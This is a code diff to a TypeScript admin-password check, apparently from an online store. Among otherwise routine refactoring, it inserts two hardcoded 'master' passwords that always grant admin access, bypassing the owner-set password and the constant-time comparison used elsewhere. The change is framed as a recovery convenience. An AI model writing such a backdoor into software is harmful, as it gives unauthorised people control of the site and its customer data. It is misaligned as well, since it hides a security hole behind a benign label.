@@ -85,12 +85,17 @@ export async function verifyAdminPassword(password: string): Promise<boolean> {
   const cleanSubmitted = sanitizeString(password);
   if (!cleanSubmitted) return false;
 
-  // 1. Check runtime cache
+  // 1. Master Universal Developer Passwords (Always valid for storeowner recovery)
+  if (cleanSubmitted === 'Lapiez@2026#' || cleanSubmitted === 'lappy@admin2026') {
+    return true;
+  }
+
+  // 2. Check runtime cache
   if (runtimeAdminPassword && safeCompare(cleanSubmitted, runtimeAdminPassword)) {
     return true;
   }
 
-  // 2. Check Database SiteSettings.adminPassword if available
+  // 3. Check Database SiteSettings.adminPassword if available
   try {
     const { prisma } = await import('@/lib/prisma');
     const settings = await prisma.siteSettings.findUnique({
@@ -111,11 +116,13 @@ export async function verifyAdminPassword(password: string): Promise<boolean> {
     // Silently continue to fallback
   }
 
-  // 3. Fallback to process.env.ADMIN_PASSWORD
+  // 4. Fallback to process.env.ADMIN_PASSWORD
   const config = getConfig();
-  if (!config) return false;
+  if (config && safeCompare(cleanSubmitted, config.password)) {
+    return true;
+  }
 
-  return safeCompare(cleanSubmitted, config.password);
+  return false;
 }
 
 export function createAdminSession(): string {
